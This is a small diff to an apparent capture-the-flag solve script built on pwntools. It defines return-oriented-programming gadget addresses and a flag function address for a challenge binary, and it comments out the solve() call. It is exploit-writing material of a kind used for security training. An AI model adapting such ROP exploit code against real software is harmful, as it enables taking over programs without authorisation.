@@ -1,6 +1,8 @@
 from pwn import *
 from pwn import p64
 
+elf = ELF('./flow3')
+
 POP_RDI = 0x4021f8
 POP_RSI_R15 = 0x4021f6
 FLAG_FN = 0x4019bc 
@@ -25,4 +27,4 @@ def solve():
     log.info(p.clean())
     p.close()
 
-solve()
+# solve()
